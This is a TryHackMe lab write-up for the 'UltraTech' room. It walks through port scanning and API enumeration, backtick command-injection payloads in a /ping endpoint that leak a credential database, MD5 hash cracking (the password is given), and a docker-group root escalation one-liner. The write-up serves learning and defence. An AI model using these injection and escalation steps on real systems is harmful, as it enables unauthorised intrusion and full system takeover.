THM Write-Up: UltraTech
Overview

Task 1: About Machine
Room: UltraTech
Platform: TryHackMe
Difficulty: Medium
Focus: Penetration testing (reconnaissance, web enumeration, command injection, credential cracking, privilege escalation)

The goal is to exploit the target VM by identifying open services, abusing a vulnerable API to gain initial access, retrieve credentials, and escalate privileges to root.

Task 2: Enumeration Phase
Task 2-1: Identify Port 8081

Start with a standard Nmap scan:

nmap -Pn -A -v <TARGET_IP>

Result

The scan reveals three open ports:

Port	Service	Version
21	FTP	vsftpd 3.0.3
22	SSH	OpenSSH 7.6p1
8081	HTTP	Node.js Express

✔ Task 2-1 completed – Port 8081 is identified.

Task 2-2 to Task 2-5: Enumerate Non-Standard Ports

Let’s manually inspect each open service.

1) FTP – Port 21

Connecting to FTP requires credentials.

ftp <TARGET_IP>


Since no credentials are known yet, we skip this service.

2) SSH – Port 22

SSH also requires valid credentials.

ssh user@<TARGET_IP>


No credentials available → skip.

3) Node.js – Port 8081

Visit the service in a browser:

http://<TARGET_IP>:8081


The page displays:

UltraTech API v0.1.3


This strongly suggests an API-based backend.
Time to enumerate endpoints.

Directory Enumeration on Port 8081
gobuster dir \
-u http://<TARGET_IP>:8081 \
-w /usr/share/dirb/wordlists/common.txt

Result
/auth   (Status: 200)


Visiting /auth:

You must specify a login and a password


At this point, we seem stuck — but remember the hint.

Full Port Scan (Keep Enumerating!)

Run a full port scan:

nmap -Pn -p- -A -v <TARGET_IP>

New Finding
31331/tcp open http Apache httpd 2.4.29


This port was missed earlier.

Task 3: Exploitation Phase
Task 3-1: Obtain the Database

Visit the newly discovered web server:

http://<TARGET_IP>:31331


A public website titled UltraTech is displayed.

robots.txt Enumeration
http://<TARGET_IP>:31331/robots.txt


Contents:

Allow: *
Sitemap: /utech_sitemap.txt


Visit the sitemap:

http://<TARGET_IP>:31331/utech_sitemap.txt

Interesting Entry
/partners.html

partners.html – Private Login Page

Visiting /partners.html shows a login form.

SQL injection attempts do not work.

So how does this login work?

Inspect Page Source

The HTML source reveals:

<form method="GET">
<script src="js/api.js"></script>


Let’s inspect api.js.

api.js Analysis (Critical Discovery)

Key findings from api.js:

API runs on port 8081

Login submits data to:

/auth


There is a health-check endpoint:

/ping?ip=


So the application logic is:

partners.html → api.js → port 8081 → /auth and /ping

Testing /ping Endpoint

Normal request:

http://<TARGET_IP>:8081/ping?ip=<TARGET_IP>


Returns a standard Linux ping output.

This confirms system command execution.

Command Injection

Try injecting commands:

http://<TARGET_IP>:8081/ping?ip=`ls`


Result reveals:

utech.db.sqlite

Reading the Database

Inject cat:

http://<TARGET_IP>:8081/ping?ip=`cat utech.db.sqlite`


This leaks credential hashes.

Task 3-2: Inside the Database

Extracted credentials:

r00t:f357a0c52799563c7c7b76c1e7543a32
admin:0d0ea5111e3c1def594c1684e3b9be84


We focus on user r00t.

Task 3-3: Crack the Hash

Hash type: MD5

Option 1: CrackStation

Paste the hash:

f357a0c52799563c7c7b76c1e7543a32


✔ Password recovered:

n100906

Option 2: Hashcat
hashcat -m 0 f357a0c52799563c7c7b76c1e7543a32 rockyou.txt

Task 3-4: Getting User Shell
Login via Web
http://<TARGET_IP>:8081/auth?login=r00t&password=n100906


Message displayed:

Restricted area
Hey r00t, can you please have a look at the server's configuration?

SSH Login
ssh r00t@<TARGET_IP>
Password: n100906


✔ User shell obtained

Task 4: Root of All Evil (Privilege Escalation)
Enumeration with LinEnum

LinEnum reveals:

User is a member of the docker group

groups


Output:

docker


This is a critical misconfiguration.

Docker Privilege Escalation (GTFOBins)

Docker allows mounting the host filesystem.

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

Root Shell Verification
whoami


Output:

root


✔ Privilege escalation successful

Flag

Navigate to:

/root


The first 9 characters of the SSH private key are the flag.

Conclusion
Vulnerabilities Used

Incomplete port enumeration

Command injection in /ping

Plain MD5 password storage

Docker group privilege escalation

Key Lesson

Never add users to the docker group unless absolutely necessary.